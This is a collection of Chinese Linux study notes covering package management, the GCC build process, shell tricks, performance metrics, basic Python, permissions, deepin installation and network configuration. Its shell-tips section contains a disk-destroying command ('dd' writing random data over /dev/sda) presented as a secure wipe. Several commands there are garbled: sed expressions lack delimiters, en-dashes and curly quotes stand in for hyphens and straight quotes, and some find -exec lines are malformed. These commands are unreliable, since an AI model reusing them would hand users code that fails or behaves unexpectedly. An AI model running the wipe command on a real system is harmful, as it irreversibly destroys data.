apt autoclean可删除缓存的包；apt -d install xxx仅下载包；apt -s install xxx模拟安装过程。

可用包信息在/var/lib/dpkg/available；包安装状态信息在/var/lib/dpkg/status；dpkg --list查看包安装状态。

dpkg -L xxx查看已安装包的文件分布；dpkg -S /bin/ls查询特定文件所属包。

远程仓库http://deb.debian.org/debian/dists/unstable下有Release、Release.gpg、Contents-<架构>文件。

远程仓库binary-amd64目录下有Release、Packages、Sources文件；本地对应文件在/var/lib/apt/lists/下。

/var/lib/apt/extended_states存储自动安装包信息；/var/cache/apt/archives是包缓存目录。

标题：Linux程序编译过程详解-2
GCC（GNU C Compiler）是编译工具，负责将C/C++语言编写的程序转换成为处理器能够执行的二进制代码。

Binutils是一组二进制程序处理工具，包括addr2line、ar、objcopy、objdump、as、ld、ldd、readelf、size等。

addr2line用来将程序地址转换成其所对应的程序源文件及所对应的代码行，也可以得到所对应的函数，帮助调试器定位源代码位置。

as主要用于汇编。

ld主要用于链接。

ar主要用于创建静态库。

ldd可以用于查看一个可执行程序依赖的共享库。

objcopy将一种对象文件翻译成另一种格式，譬如将.bin转换成.elf、或者将.elf转换成.bin等。

objdump主要的作用是反汇编。

readelf用于显示有关ELF文件的信息。

size用于列出可执行文件每个部分的尺寸和总尺寸，包括代码段、数据段、总大小等。

C运行时库（CRT）支持C语言编译器，C语言标准定义了C标准库函数原型，但其实现由C运行库提供；C++也有对应的C++运行时库。

预处理过程包括删除#define、展开宏定义、处理条件预编译指令、处理#include、删除注释、添加行号和文件标识、保留#pragma。使用gcc预处理命令：gcc -E hello.c -o hello.i，选项-E使GCC预处理后即停止。

编译过程对预处理完的文件进行词法分析、语法分析、语义分析及优化后生成汇编代码。使用gcc编译命令：gcc -S hello.i -o hello.s，选项-S使GCC编译后停止，生成汇编程序。

汇编过程处理汇编代码，生成处理器能识别的指令，保存在.o目标文件中。使用gcc汇编命令：gcc -c hello.s -o hello.o，选项-c使GCC汇编后停止；也可直接调用as：as -c hello.s -o hello.o。hello.o为ELF格式可重定向文件。

链接分为静态链接和动态链接。静态链接在编译阶段把静态库加入可执行文件，文件较大；动态链接在链接阶段加描述信息，程序执行时加载动态库。

Linux中，gcc编译链接时动态库搜索路径顺序：首先是gcc命令的-L参数指定路径；然后是环境变量LIBRARY_PATH指定路径；最后是默认路径/lib、/usr/lib、/usr/local/lib。

Linux中，执行二进制文件时动态库搜索路径顺序：首先是编译目标代码时指定的路径；然后是环境变量LD_LIBRARY_PATH指定路径；接着是配置文件/etc/ld.so.conf中指定路径；最后是默认路径/lib、/usr/lib。

gcc链接时，若路径中有同名静态库（.a）和动态库（.so），默认优先选择动态库；使用-static选项可强制使用静态库链接。

典型ELF文件包含.text（指令代码段）、.rodata（只读数据）、.data（已初始化全局变量和静态局部变量）、.bss（未初始化全局变量和静态局部变量）、.debug（调试符号表）等段。

使用readelf -S可查看ELF文件各个section的信息。

使用objdump -D可对ELF文件进行反汇编；使用objdump -S可将反汇编与C语言源代码混合显示（需编译时加-g选项）。

标题：Linux实用技巧总结
快速清空文件的方法有：> access.log；true > access.log；cat /dev/null > access.log；echo -n "" > access.log；echo > access.log；truncate -s 0 access.log。: 是shell内置命令，表示空语句，输出空内容覆盖文件。

通过dd命令可快速生成大文件，如dd if=/dev/zero of=file.img bs=1M count=1024生成1G的file.img。

用dd命令安全擦除硬盘数据：dd if=/dev/urandom of=/dev/sda，通过生成随机数据写入硬盘实现。

Linux下制作系统盘的命令：dd if=ubuntu-server-amd64.iso of=/dev/sdb，sdb可以是U盘或普通硬盘。

查看进程运行时间用ps -p 进程号 -o etimes,etime；查看进程内存信息用ps -p 进程号 -o rss。

tail -f test.log可动态实时查看日志；tail -f test.log | sed '/Failed/ q'在日志出现Failed时停止监控。

时间戳转日期时间：date -d@时间戳 +"%Y-%m-%d %H:%M:%S"；查看当前时间戳：date +%s。

用time命令获取程序运行时间，如time ./test，输出real（钟表时间）、user（用户空间CPU时间）、sys（内核空间CPU时间）。

在Linux命令行查看ascii码的命令是man ascii。

删除乱码文件：先用ls -i查inode号，再用find . -inum inode号 -exec rm {} \;。

Linux上获取公网IP地址的命令：curl ip.sb 或 curl ifconfig.me。

wget批量下载网页资源：wget -r -nd -np --accept=pdf 网址，--accept指定资源类型。

历史命令技巧：!!重复上条命令；!N执行历史第N条；!pw执行最近以pw开头的；!$表示上条命令最后一个参数。

快速搜索历史命令：按Ctrl + r，键入关键词搜索，回车执行。

命令前加空格，该命令不会被history保存到历史记录，适合含敏感信息的命令。

查找当前目录下所有以.tar结尾的文件并移动到指定目录：find . -name “*.tar” -exec mv {} ./backup/ ;。

批量解压当前目录下以.zip结尾的文件到指定目录：for i in `find . –name “*.zip”–type f `; do unzip –d $i /data/www/img/; done。

sed命令示例：去掉test.txt行首的.字符：sed -i ‘s/^. g’ test.txt；行首加a：sed ‘s/^/a/g’ test.txt等。

判断目录是否存在，不存在则新建，存在则打印信息：if [ ! –d /data/backup/ ];then mkdir –p /data/backup/;else echo "The Directory already exists,please exit";fi。

监控根分区空间，大于等于90%发邮件：while sleep 5m;do for i in `df -h |sed -n ' $/p' |awk '{print $5}' |sed 's/% g'`;do if [ $i -ge 90 ];then echo “...” |mail -s “...” XXX@XXX.XX;fi;done;done。

统计Nginx访问日志访问量前20的IP：cat access.log |awk '{print $1}'|sort|uniq -c |sort -nr |head -20。

sed修改行后参数：sed -i '/SELINUX/s/enforcing/disabled/' /etc/selinux/config；替换目录：sed 's:/user/local:/tmp:g' test.txt。

打印文件最大和最小值：sed 's/ / /g' a.txt |sort -nr|sed -n ’1p;$p’。

snmpd抓取v2版本cacti数据：snmpwalk -v2c -c public 192.168.0.241。

替换文本中以jk结尾的为yz：sed -e ‘s/jk$/yz/g’ b.txt。

tcpdump抓包：抓取56.7通过80请求的包：tcpdump -nn host 192.168.56.7 and port 80；排除0.22 80端口：tcpdump -nn host 192.168.56.7 or ! host 192.168.0.22 and port 80。

显示最常用的20条命令：cat .bash_history |grep -v ^# |awk ‘{print $1}’ |sort |uniq -c |sort -nr |head -20。

删除最后创建时间3天前的*.log文件：find . -mtime +3 -name "*.log" |xargs rm -rf {} ;。

移动某目录下大于100k的文件至/tmp：find . -size +100k -exec mv {} /tmp ;。

防火墙配置只允许访问80端口：iptables -F; iptables -X; iptables -A INPUT -p tcp --dport 80 -j accept; iptables -A INPUT -p tcp -j REJECT；或iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT。

Nginx日志统计访问ip最多的前10个：cd /home/logs.nginx/default; sort -m -k 4 -o access.logok access.1 access.2 access.3 .....

替换文件中的目录：sed 's:/user/local:/tmp:g' test.txt；或sed -i 's usr/local tmp/g' test.txt。

标题：Linux性能测试之性能测试指标详解
性能测试指标包括响应时间、并发用户/并发、点击率、吞吐量、TPS/QPS、PV/UV；Linux服务器指标包括CPU使用率、内存占用率、磁盘IO、系统平均负载等。

响应时间是请求或操作从发出到接收到反馈的时间，包括应用服务器处理、网络传输、数据库服务器处理时间。公式：响应时间=A+B1+B2+B3+C（A为客户端处理时间，B1-B3为网络节点传输时间，C为服务器响应时间）。

并发指多个用户同一时期进行相同事务处理。分绝对并发（同一时间点同时发请求）和相对并发（同一时间区间发请求）。系统/模块并发多为相对并发，接口并发倾向绝对并发。

点击量是网站点击数统计。点击率在性能测试中常指每秒页面点击数（http请求数），越大服务器压力越大。

吞吐量是系统处理客户请求数量总和。吞吐率是单位时间处理的请求数，可从业务（请求数/秒等）、网络（字节数/秒等）、系统角度衡量。

TPS是每秒系统处理的事务量，事务是自定义操作集合。QPS是每秒查询或访问服务器次数。区别：一事务可含多次查询，此时1TPS等于多QPS；仅一次则等价。

PV是页面浏览量/点击量，多次访问同页面累计。UV是独立访客，一段时间内相同客户端访问只记一次。可按周期统计，如全天PV、峰值UV等。

CPU使用率=1-CPU空闲时间/总CPU时间。top命令查看，字段有us（用户态）、sy（内核态）、ni（低优先级用户态）、id（空闲）等。us高需优化用户代码，sy高需优化系统调用等，us+sy≤70%状态良好。

Linux内存管理最大化利用率，空余内存划分为cached。cached缓冲文件内容，buffers缓冲块设备metadata等。top和free -h查看内存。系统已用内存=MemTotal-MemFree，物理已用内存=MemTotal-MemFree-MemBuffers-MemCached。系统内存占用率≤70%状态良好。

系统平均负载用uptime、top、w命令查看，是1、5、15分钟内平均活跃进程数（可运行和不可中断状态）。值超过CPU数量可能有性能瓶颈。1min值大于5、15min值说明负载增加，反之则减小。

磁盘IO用iostat -x -k 2 3查看，关注iowait%和%util。iowait%超过50%或大于其他CPU指标可能有IO问题；%util≤70%状态良好。

Linux常用性能命令：CPU用cat /proc/cpuinfo、top；内存用free -h、top；负载用uptime、top、w；磁盘用fdisk -l、df -h；整体用vmstat 3 2。

标题：黑客000的Python简易教程
Python由荷兰人Guido van Rossum于1989年发明，第一个公开发行版发行于1991年。

Unix & Linux平台安装Python步骤：下载源码压缩包，解压（tar -zxvf Python-3.8.5.tgz），进入目录（cd Python-3.8.5），配置（./configure），编译安装（make && make install）。

Windows平台安装Python步骤：访问Windows版下载地址，选择python-3.8.5-amd64.exe等安装包，双击后按默认设置点击“下一步”完成安装。

第一个Python程序：右键桌面新建1.py文件，写入相关内容。

运行1.py的命令：在终端输入chmod a+x ./1.py&&./1.py。

Python保留字可通过import keyword; print(keyword.kwlist)查看，不能用作标识符名称。

Python单行注释以#开头，如#这是单行注释。

Python多行注释用三对单引号（'''）或三对双引号（\"\"\"）括起来。

Python用缩进来表示代码块，同一代码块需相同缩进空格数，可用Tab键。

Python有7个标准数据类型：int（整数）、float（小数）、str（字符串）、list（列表）、tuple（元组）、set（集合）、dict（字典）。

Python不可变数据类型有int、float、str、tuple。

Python可变数据类型有list、set、dict。

Python用type()函数检查变量类型，如print(type(str0))。

Python字符串可用单引号或双引号，不能混合匹配；三对引号可表示多行字符串。

Python用'\'作为转义字符，如换行符为\n，反斜杠为\\。

Python字符串用+连接，用*重复，如str0 * 2表示重复两次。

字符串切片str0[n]表示第n+1个字符，如str0[0]是第一个字符。

字符串切片str0[start:stop]表示从第start+1个字符到stop截止的字符。

format()方法格式化字符串，可用命名索引、编号索引或空占位符，如"字{}串{}式{}".format("符","格","化")。

f-string是Python3.6引入的，形式为f"{content:format}"，如f'python is {var}'。

标题：shell运行原理和Linux权限详解
Linux的核心（kernel）不能直接被用户使用，需通过shell（命令行解释器）沟通。shell将用户命令翻译给kernel，将kernel处理结果翻译给用户。bash是具体的shell，如centos 7使用bash。

shell运行原理：做命令行解释，阻止有害命令保护系统，子进程问题不影响父进程shell。

Linux用户分超级用户（root，可做任何事，提示符#）和普通用户（有限操作，提示符$）。切换用户用su [用户名]，从普通到root可省用户名，需输root密码；切回普通用户推荐exit或Ctrl+d。

文件权限=人+事物属性。人分为拥有者（u）、所属组（g）、其它（o）。事物属性为r（读/4）、w（写/2）、x（执行/1），“—”表示无此权限。

文件类型用ls -l第一列字符区分：d（文件夹）、-（普通文件）、l（软链接）、b（块设备文件）、p（管道文件）、c（字符设备文件）、s（套接口文件）。

权限更改可用chmod命令，如chmod 777 text.c、chmod u+x text.c。只有文件拥有者和root可改权限，选项-R递归修改目录权限。

chown修改文件拥有者，格式chown [参数] 用户名 文件名，可同时改拥有者和所属组（如chown user:group file）。chgrp修改所属组，格式chgrp [参数] 用户组名 文件名，选项-R递归修改。

umask查看或修改文件掩码。新建文件默认权限0666，目录0777，实际权限为默认权限减去umask。超级用户默认掩码0022，普通用户0002。

file指令辨识文件类型，语法file [选项] 文件或目录…，选项-c详细显示执行过程，-z解读压缩文件内容。

进入目录需执行权限（x）；无读权限（r）无法用ls查看目录内容；无写权限（w）无法在目录中创建或删除文件。

粘滞位用chmod +t 目录名设置，仅对目录有效，限制other权限。设粘滞位后，目录中只有文件拥有者和root可删除文件，如/tmp目录常用。

标题：Windows安装virtualbox增强功能全屏化显示
在Windows上通过Virtualbox安装deepin后，需安装增强工具实现全屏显示，点击安装时可能出现无法加载VBoxGuestAdditions.iso的提示。

安装增强功能第一步：检查VBox目录中是否有VBoxGuestAdditions.iso，官网下载的VBox通常有，需找到其中的VBoxLinuxAdditions.run。

在deepin中，可通过文件管理器查看相关文件，用ctrl+alt+t打开终端，运行sudo ./VBoxLinuxAdditions.run，重启后实现全屏。

不懂命令行的用户，可在deepin的media文件夹-用户名文件夹中找到VBox_GAs_6.0.10，右击在终端中打开，输入sudo ./VBoxLinuxAdditions.run并重启。

标题：常用高级命令
top命令的功能是用于实时显示系统运行状态，包含处理器、内存、服务、进程等重要资源信息。

top命令常用参数中，-d <秒>用于改变显示的更新速度。

top命令的常用交互参数中，P表示以CPU的使用资源排序显示。

执行top -c命令可以以默认格式显示系统运行信息，并提供完整的进程路径及名称。

top命令输出中的load average: 0.00, 0.01, 0.05表示系统1分钟，5分钟，15分钟平均负载。

htop是linux系统中的一个互动的进程查看器，相比较top的优势有可以横向或纵向滚动浏览进程列表，启动更快，杀进程时不需要输入进程号，支持鼠标选中操作，top已不再维护。

htop非交互式参数中，-C表示使用单色配色方案。

执行htop -u linuxcool_user命令可以显示指定用户linuxcool_user的进程。

vmstat命令的含义为显示虚拟内存状态，但可以报告关于进程、内存、I/O等系统整体运行状态。

vmstat -a参数用于显示活动内页。

vmstat 2 3命令表示指定状态信息刷新的时间间隔为2秒，刷新3次。

vmstat输出中，procs部分的r表示等待执行的任务数，b表示等待IO的进程数量。

dstat命令是一个用来替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的全能系统信息统计工具。

dstat -c参数用于显示CPU系统占用，用户占用，空闲，等待，中断，软件中断等信息。

执行dstat 3命令可以每三秒收集一次cpu、disk、net、page、system信息。

Glances是一个用Python编写的系统监控工具，使用psutil库从系统获取信息，可监控CPU、平均负载、内存等。

glances -s -B 192.168.10.2 &命令可在192.168.10.2主机启动glances服务。

glances -t 6命令用于设置屏幕刷新的时间间隔为6秒。

sar命令是Linux下系统运行状态统计工具，可从多方面报告系统活动，包括文件读写、系统调用、磁盘I/O等。

sar -u参数用于输出cpu使用情况和统计信息。

标题：使用Find和Locate命令在Linux中搜索文件
使用find命令按名称查找文件，语法为find -name "query"，区分大小写；-iname选项可忽略大小写。

find命令可用!或-not反转搜索，查找不匹配关键字的文件，如find -not -name "query_to_avoid"、find ! -name "query_to_avoid"。

find命令的-type选项可指定文件类型，如b代表块设备，f是常规文件，d为目录等。

find命令的-size参数按文件大小过滤，后缀c是bytes，k是kilobytes，M是megabytes等。

Linux文件有-atime（访问时间）、-mtime（修改时间）、-ctime（更改时间），find命令可按这些时间过滤。

find命令用-user和-group参数按用户或组搜索文件，-perm选项搜索指定权限的文件。

find命令的-exec参数可对查找结果执行命令，{}是匹配文件的占位符，;表示命令结束。

locate命令比find快，依赖文件系统数据库，centos8中用yum安装mlocate包，updatedb命令手动更新数据库。

locate命令用-S选项可检索已存储信息的统计，如数据库中的目录、文件数量等。

标题：算法相关知识点
O(1)：常数复杂度。常数系数不考虑，都写做1。

O(log(N))：对数复杂度。

递归函数的特点：参数（规模）逐渐缩小，会收敛。

递归函数构成部分：平凡解（退出条件）、计算任务、进入下一层（缩减规模）。

递推和递归的不同点：递归是函数方法，递推是循环方法。

前序遍历：根左右。

中序遍历：左根右。

后序遍历：左右根。

二分查找需满足：有序，有上下界的索引结构。

动态规划解决具备最优子结构的课题，使用递推，由底向上迭代。

数组的lookup复杂度为O(1)。

链表的insert复杂度为O(1)。

贪心算法适用于当下最优 == 全局最优（或可接受）的情况，即存在最优子结构。

堆栈法适用于处理最近相关的问题。

双指针夹逼法是一种编程技巧。

标题：字符集安装
/usr/share/i18n/charmaps存放Linux可用字符集安装包，如GBK.gz是GBK字符集包。

/usr/share/i18n/locales存放所有语言包对应的locale信息，如zh_CN.GBK是完整字符集，zh表语言，CN表国家，GBK表编码。

安装GBK/中文字符集需切换到/usr/share/i18n/charmaps目录，解压GBK.gz，再用localedef命令安装。

查看字符集可使用locale -a命令，若结果中有zh_CN.GBK则表示安装成功。

标题：认识Linux系统结构
Linux 系统一般有 4 个主要部分：内核、shell、文件系统和应用程序。

内核是操作系统的核心，负责管理系统的进程、内存、设备驱动程序、文件和网络系统。

Linux 内核由如下几部分组成：内存管理、进程管理、设备驱动程序、文件系统和网络管理等。

Linux采用“虚拟内存”的内存管理方式，将内存划分为4KB的“内存页”。

当可用内存被消耗光时，页面可移出内存并放入磁盘，这个过程称为交换。

进程调度是让进程轮流运行的方法，完成调度的程序称为调度程序，时间间隔称为“时间片”。

Linux常见的进程间通讯机制有信号、管道、共享内存、信号量和套接字等。

Linux将新的文件系统通过“挂装”操作挂装到某个目录，支持Ext2、FAT、VFAT等多种文件系统。

虚拟文件系统（VFS）为所有设备提供统一接口，隐藏各种硬件细节，位于SCI和内核支持的文件系统之间。

设备驱动程序控制操作系统和硬件设备的交互，运行在高特权级环境，错误可能导致系统崩溃。

Linux Shell是命令解释器，提供用户与内核的交互接口，常见版本有Bourne Shell、BASH、Korn Shell、C Shell。

Linux文件类型主要有：普通文件、目录文件、链接文件、设备文件、管道（FIFO）文件、套接字（socket）文件。

Linux采用树型结构，最上层是根目录，所有目录从根目录出发，不同于Windows的多盘符树型结构。

硬盘分区有三种：主分区、扩展分区和逻辑分区，主分区和扩展分区数目之和不超过四个。

IDE接口硬盘标识为/dev/hda1、/dev/hdb等；SCSI、SATA接口硬盘标识为/dev/sda、/dev/sdb等。

/bin存放二进制可执行命令，/dev是设备特殊文件，/etc包含系统管理和配置文件。

Ext2是Linux早期常用文件系统，Ext3是其升级版带日志功能，XFS是SGI开发的先进日志文件系统。

文件系统格式化后分为超级块、inode块、数据块，超级块记录整体信息，inode块记录文件属性，数据块存内容。

硬连接原文件名和连接文件名指向相同物理地址，不能跨文件系统；软连接类似快捷方式，数据是目标文件路径。

挂载是将文件系统顶层目录挂到另一个目录（挂载点），使它们成为整体，挂载点必须是目录。

/etc/fstab文件列出Linux开机时自动挂载的文件系统，可配置自动挂载Windows分区。

标题：软件包管理-2
主要的包管理工具包括：Apt、aptitude、Synaptic、apt-get、dpkg。

dpkg是Debian的中级包管理器，也用于深度操作系统。

dpkg的功能包括：安装或管理单个软件包、升级软件套件、安装应用安全补丁。

dpkg被称为“中级”是因为：有更低级的dpkg-deb处理.deb包；dpkg检查依赖但不解决，需高级工具协助。

APT是管理Debian包的工具集，用于管理系统安装的应用。

APT的功能包括：安装、移除应用，保持应用更新等，能解决依赖并从仓库获取包。

APT委托dpkg执行实际的包安装和移除操作。

dpkg安装deb包的命令：sudo dpkg -i <package.deb>。

dpkg -r删除包保留配置，dpkg -P完全清除包（含配置）。

apt-get update用于更新软件包列表，确保列表是最新的。

apt-get install package_name用于安装新软件包。

apt-get remove保留配置文件，--purge remove删除配置文件。

apt-cache search package_name在软件包列表中搜索字符串。

安装apt-file的命令：apt install apt-file。

aptitude处理依赖更佳，删除包时会同时删除其依赖的包。

aptitude safe-upgrade用于执行一次安全的升级。

apt-get clean删除所有包，autoclean仅删除旧版本和无用包。

解决E:Sub-process /usr/bin/dpkg returned an error code (1)：cd /var/lib/dpkg，sudo mv info info.bak等一系列命令。

解决无法获得锁的问题：关闭其他包管理程序，或删除相关lock文件。

降级软件包的命令格式：sudo apt-get install pkg=version。

阻止软件包升级：sudo echo "firefox hold" | sudo dpkg --set-selections。

apt-get autoremove用于删除依赖于被删包的无用依赖包。

upgrade仅更新包不增删，dist-upgrade可根据依赖增删包及配置。

添加PPA需先安装：sudo apt-get install python-software-properties等。

标题：输入法介绍
Linux系统上的输入法接口通常由im-config管理，类似Windows的输入法切换面板和MacOS的输入源管理器，终端输入im-config可调出可视化界面切换输入法框架。

音码是以汉字发音为根据的编码方式，拼音输入法是其代表。

形码依据汉字字形拆分，种类多，代表有86五笔、98五笔、新世纪五笔等。

音形码杂糅音码与形码，代表有自然码、二笔、小鹤音形。

中文输入法本质是字典程序，建立字母到汉字的映射，通过响应键盘事件实现汉字检索。

拥有独立完整的后端检索引擎才是独立输入法程序，其性能决定输入法的性能与健壮程度，Linux上的ibus、fcitx、yong、rime均是此类。

输入法前端皮肤系统因系统平台而异，良好设计应使前后端独立，方便移植，如RIME可在多系统使用同一份配置。

输入法码表是编码与汉字映射的文本文件，执行时转储为二进制提高效率，格式多为GB18030或UTF-8无BOM。

单行单义类码表一行含一个词条、编码，可能有词频，不加词频则上优先于下。

单行多义类码表一行中编码对应多个词条，重码按从左到右顺序排列。

小小输入法安装需进入程序文件夹终端执行sudo ./yong-tool.sh --install和./yong-tool.sh --select，再进QT插件文件夹执行sudo ./qt.sh，最后重启生效。

小小输入法卸载需进入程序文件夹终端执行sudo ./yong --uninstall。

小小输入法程序目录在解包文件夹，用户有读写权限，.yong目录的yong.ini是用户配置，程序优先读取。

小小输入法码表是单行多义类，第一行需声明UTF-8，新增方案需在mb文件夹放方案定义与码表，并修改yong.ini。

fcitx是Linux流行输入法框架，提供txt2mb命令行工具转制码表，如txt2mb 98wb.txt 98wb.mb。

fcitx安装可终端执行sudo apt install fcitx fcitx-table，切换用im-config，卸载用sudo apt purge fcitx。

标题：Refind+uefi在中柏Ezpad_6_plus上安装深度系统
中柏Ezpad 6 plus是一款二合一平板电脑，CPU为英特尔Apollo Lake N3450 1.1~2.2GHz，内存6G，SSD 60G，eMMC 58G，有DC电源接口等，尺寸11.6，屏幕为电容屏1920×1080。

安装深度系统需要deepin系统镜像、深度启动盘制作工具、refind文件，refind可在其官网下载。

制作启动盘时，需用深度启动盘制作工具制作安装盘，解压refind文件，将refind_x64.efi重命名为BOOTX64.EFI，复制refind目录下所有文件到启动盘EFI/boot目录，将refind.conf-sample命名为refind.conf，编辑refind.conf添加menuentry等内容。

menuentry "Try deepin" 中，loader指定加载的内核引导文件路径为/live/vmlinuz.efi，options参数为"file=/cdrom/pressed/deepin.seed boot=live quiet splash ---"，initrd指定临时根文件系统路径为/live/initrd.lz。

系统分区需删除要安装的分区留出空白空间，要有efi分区，示例分区方案为efi, /, /home, swap。

安装系统后，需重启进入live CD系统，挂载efi分区，如sudo mount /dev/sda1 ~/Music，再复制U盘/EFI/boot/下所有文件到efi分区boot文件夹，删除refind.conf。

重启后进入BIOS，将UEFI OS项设置为第一启动项，启动系统进入deepin。

安装refind引导的另一种方法：插入U盘引导进入refind选择界面，找到vmlinuz开头的引导项进入系统，联网后更新软件列表并安装refind，切换显卡驱动为Intel兼容模式。

标题：UEFI 安装15.4 RC 踩坑记
用户用U盘启动ISO镜像安装15.4RC，legacy BIOS电脑顺利安装，UEFI BIOS电脑多次失败，记录了关键问题。

Deepin安装器不识别非标准ESP分区，也不能手动指定，需在启动安装器前将ESP分区标志设为esp，安装器即可识别。

用户覆盖安装15.4RC（格式化分区）时，在67%卡死，多次尝试后，删除ESP分区中15.3留下的(EPS)/EFI/deepin和(ESP)/EFI/ubuntu文件夹后成功。

安装后重启，未出现登录界面，提示cannot open access to console,the root account is locked，经排查是分区挂载问题，删除/etc/fstab文件中多余内容后解决。

用户安装前UEFI启动序列有一个grub2启动项，与Deepin的grub2启动文件不冲突，却被删除了。

安装成功时，物理光驱突然弹出，用户质疑不能检测是否为物理光驱启动。

用户建议UEFI启动项名由“deepin”改为“Deepin Linux”。

标题：deepin安装指南
deepin安装前需下载iso映像，检查其md5码，用iso中的刻录工具将iso刻录到u盘，准备好可能需要的替换u盘。

电脑bios设置需关闭安全模式、关闭兼容模式csm、开启uefi模式并保存；硬盘需为gpt分区表，可用geniusdisk工具无损转换，需提前准备空分区。

deepin安装的磁盘选择有简单、高级、全盘三种模式：简单模式需提前准备系统分区和efi分区；高级模式可对分区操作、格式化、挂载；全盘模式适用于单硬盘且数据无需保留的情况。

安装阶段出现花屏等故障，排除iso、u盘、usb插口问题后，可在引导菜单按e编辑，在linux行后（--前）输入nomodeset等参数，按f10执行，该修改不保存。

可能有用的内核引导参数组合包括：nomodeset（改变显示模式）、仿冒win7的acpi参数、acpi=off（关闭acpi）、acpi_backlight=vendor（修改背光模式）等。

linux硬盘分区无c、d盘称呼，设备为/dev/sda等，分区为/dev/sda1等，通过挂载到目录实现读写，目录根为/，分区文件系统默认ext4，也支持fat和ntfs。

linux安装建议分区：/（30~50G，根目录）、/home（剩余全部，用户数据）、交换分区（与内存同大，无挂载点）、/boot/efi（100M以上，uefi引导分区）。

安装deepin检测不到ssd固态硬盘，可能因主板bios设置ssd接口为raid，需改为achi；切换后win10需进安全模式修复，之后可安装deepin。

linux兼容性问题由内核、固件、驱动构成，解决思路是尝试不同组合，升级它们，推荐较新但非最新版本以获广兼容性。

更新deepin固件可从清华镜像源下载最新固件，解压后进入目录执行make check和sudo make install，再用sudo update-initramfs -uk all更新内核启动映像。

deepin推荐内核版本为5.1.x，可从deepin天天用群或ubuntu下载编译好的内核，自行编译耗时且有难度。

nvidia显卡的linux驱动有nouveau（默认开源第三方）、nvidia（官方）、bumblebee（支持双显卡切换，基于官方），intel集成显卡驱动为i915，amd为amdgpu。

安装大黄蜂驱动：sudo apt install bumblebee-nvidia primus和sudo apt install nvidia-driver，有问题可先删除（sudo apt purge相关包）再安装，安装卡住可重启重试。

查看显卡及驱动信息可执行lspci -nnk |egrep -i "vga | 3d | display" -A3或lspci -nnk命令。

大黄蜂驱动默认用集成显卡，通过primusrun xxx调用独立显卡运行程序；可用glxinfo查看集成显卡信息，primusrun glxinfo查看独立显卡信息。

使用win应用的推荐方案是虚拟机，wine并非万能，可学习linux替代品或放弃使用。

linux更推荐cli程序，因其实用通用，在任意发行版可复用知识，系统故障时图形界面常无法修复，需依赖cli。

linux的自由体现在可定制，但需相关知识，多数设置可通过修改配置文件实现，自由程度取决于知识积累、搜索能力和学习热情。

不同linux发行版的区别主要在包管理方案，共通点在于内核、固件、驱动等，大部分知识通用，深入后会发现共通之处更多。

标题：外置移动硬盘上安装体验
安装deepin到外置移动硬盘的步骤：1.准备镜像U盘；2.插入安装U盘和移动硬盘；3.安装时选择移动硬盘（建议不勾选加密安装）。

外置移动硬盘安装deepin后，可在不同设备使用，建议在原电脑用，其他设备可能无法读入；插入后需修改BIOS启动项顺序；分区安装建议关闭安全启动；安装在U盘运行慢。

标题：文件下载
GUI界面下，可使用系统自带下载器和浏览器进行文件下载，更多工具可查看应用商店。

安装curl的命令为：sudo apt install curl。

使用curl测试网站连接的命令为：curl 域名，执行后可查看网页HTML源码。

curl下载文件到当前目录的命令为：curl -O URL地址。

curl将文件保存为指定文件名的命令为：curl -o 文件名 -O URL地址。

安装wget的命令为：sudo apt install wget。

wget下载文件到当前目录的命令为：wget URL地址。

wget下载文件到指定目录的命令为：wget -P 需要下载到的文件目录 URL地址。

wget将文件设置为指定文件名的命令为：wget -O 文件名 URL地址。

wget下载文件到指定目录并设置指定文件名的命令为：wget -P 目录 -O 文件名 URL地址。

安装aria2的命令为：sudo apt install aria2。

aria2下载文件到当前目录的命令为：aria2c URL地址。

aria2支持断点续传，使用参数-c，命令格式：aria2c -c URL地址。

aria2可通过-s参数设置下载线程数，命令格式：aria2c -s 线程数 URL地址。

aria2通过-d参数设置文件保存目录，命令格式：aria2c -d 保存目录 URL地址。

aria2通过-o参数设置文件保存的文件名，命令格式：aria2c -o 文件名 URL地址。

添加星火应用商店源后，可通过sudo apt install apt-fast安装apt-fast。

ss-apt-fast集成于星火应用商店的主程序包，安装命令：sudo apt install spark-store（需先安装apt-fast）。

标题：网络管理
/etc/hosts是主机地址配置文件，也叫本地主机文件，内容为IP地址与其对应的主机名，用于将主机名称解析为IP地址，包含IP与主机名的映射及主机名别名。

/etc/services是Internet网络服务文件，记录网络服务名及其对应的端口号和协议，每行格式为服务名 端口号/协议 [别名] [#注释]。

/etc/hosts.allow和/etc/hosts.deny是tcpd服务器的配置文件，控制外部IP对本机服务的访问，格式为server_name:hosts-list[:command]，allow控制允许访问的IP，deny控制禁止访问的，冲突时以deny为准。

/etc/network/interfaces是网络配置文件，可设置动态ip（dhcp）或静态ip，静态配置需指定address、netmask、gateway，修改后需重启网卡生效（sudo /etc/init.d/networking restart或sudo systemctl restart networking.service）。

/etc/host.conf确定主机名解释顺序，当同时存在DNS和/etc/hosts时生效，示例有order hosts,bind（先hosts后DNS）、multi on（允许多IP）等。

/etc/resolv.conf是DNS域名解析配置文件，决定dns服务器的优先级，主要关键字有nameserver（定义DNS服务器IP）、domain（本地域名）等，最主要的是nameserver。

ifconfig用于查看和更改网络接口的地址和参数（如IP、子网掩码等），超级用户可使用，参数包括-up（激活接口）、-down（关闭接口）等，如ifconfig eth0 192.168.4.1 netmask 255.255.255.0 up配置IP并激活。

ip是iproute2软件包中的网络配置工具，可替代ifconfig、route等，支持添加、删除IP等操作，如ip addr add 192.168.1.1/24 dev eth0添加IP到eth0。

ping用于检测主机网络接口状态，使用ICMP协议，参数包括-c（指定回应次数）、-i（间隔秒数）等，如ping -c 5 www.google.com.hk指定ping 5次。

netstat用于检查Linux网络状态，显示开启的端口、服务状态等，-a参数显示所有连线中的Socket，包括监听状态的端口。

telnet是远程登录协议和命令，用于开启终端机阶段作业并登入远端主机，需知道远程主机的合法用户名和口令，不支持X-Window图形环境。

ftp是文件传输协议和命令，用于远程文件传输，支持ASCII和二进制文件传输，内部命令包括ls（列远程目录）、get（下载文件）、put（上传文件）等。

route用于手工产生、修改和查看路由表，-add添加路由，-delete删除路由，如route add 0.0.0.0 192.168.1.1添加默认路由。

Linux Deepin中更改主机名称需修改/etc/hostname文件（输入新主机名）和/etc/hosts文件（替换原主机名）。

检测IPv6可通过ifconfig查看inet6地址或访问http://www.kame.net/（乌龟爬行则支持），深度系统可安装miredo（sudo apt-get install miredo）并修改hosts，重启网络生效。

telnet玩中文mud乱码可使用luit转码，命令为luit -encoding gbk telnet 目标地址 端口。

标题：Deepin+Windows10双系统安装教程
